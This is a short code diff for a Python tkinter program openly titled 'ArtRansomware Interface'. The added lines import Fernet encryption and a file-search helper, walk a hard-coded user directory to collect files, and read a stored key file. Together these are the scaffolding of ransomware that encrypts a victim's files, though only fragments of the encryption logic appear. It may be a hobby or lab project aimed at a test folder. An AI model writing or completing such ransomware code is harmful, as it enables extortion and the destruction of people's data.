@@ -1,8 +1,17 @@
 import tkinter as tk
 from tkinter import *
+import threading
 from tkinter import ttk
 from tkinter import messagebox as MessageBox
 from PIL import Image, ImageTk
+from cryptography.fernet import Fernet
+import sys
+import os
+from termcolor import colored
+import allfiles1
+import signal
+
+
 class App(tk.Tk):
     def __init__(self, title):
         super().__init__()
@@ -157,5 +166,9 @@ signal.signal(signal.SIGINT, def_handler)
 def return_key():
     return open('key.key', 'rb').read()
 
-
+if __name__ == "__main__":
+    base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
+    allfiles1.searching_files(base_directory)
+    files = allfiles1.file_list
+    app = App("ArtRansomware Interface")
 
